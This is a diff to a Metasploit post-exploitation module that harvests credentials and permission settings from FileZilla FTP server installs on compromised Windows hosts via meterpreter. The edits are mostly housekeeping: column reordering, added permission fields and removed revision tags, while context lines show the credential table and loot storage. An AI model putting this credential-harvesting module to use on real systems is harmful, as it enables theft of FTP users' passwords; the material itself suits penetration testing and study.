@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -24,7 +20,6 @@ class Metasploit3 < Msf::Post
 			'Description'    => %q{ This module will collect credentials from the FileZilla FTP server if installed. },
 			'License'        => MSF_LICENSE,
 			'Author'         => ['bannedit'],
-			'Version'        => '$Revision$',
 			'Platform'       => ['win'],
 			'SessionTypes'   => ['meterpreter' ]
 		))
@@ -94,10 +89,10 @@ class Metasploit3 < Msf::Post
 		'Indent'    => 1,
 		'Columns'   =>
 		[
-			"User",
-			"Password",
 			"Host",
 			"Port",
+			"User",
+			"Password",
 			"SSL"
 		])
 
@@ -110,14 +105,15 @@ class Metasploit3 < Msf::Post
 			"User",
 			"Dir",
 			"FileRead",
+			"FileWrite",
 			"FileDelete",
 			"FileAppend",
 			"DirCreate",
 			"DirDelete",
 			"DirList",
 			"DirSubdirs",
-			"Home",
-			"AutoCreate"
+			"AutoCreate",
+			"Home"
 		])
 
 		configuration = Rex::Ui::Text::Table.new(
@@ -172,7 +168,7 @@ class Metasploit3 < Msf::Post
 
 		perms.each do |perm|
 		permissions << [perm['host'], perm['user'], perm['dir'], perm['fileread'], perm['filewrite'], perm['filedelete'], perm['fileappend'],
-			perm['dircreate'], perm['dirdelete'], perm['dirlist'], perm['dirsubdirs'], perm['autocreate']]
+			perm['dircreate'], perm['dirdelete'], perm['dirlist'], perm['dirsubdirs'], perm['autocreate'], perm['home']]
 		end
 
 		vprint_status("    Collected the following configuration details:")
@@ -211,7 +207,7 @@ class Metasploit3 < Msf::Post
 				:target_port => config['admin_port']
 			)
 		end
-		
+
 		p = store_loot("filezilla.server.creds", "text/csv", session, credentials.to_csv,
 			"filezilla_server_credentials.csv", "FileZilla FTP Server Credentials")
 
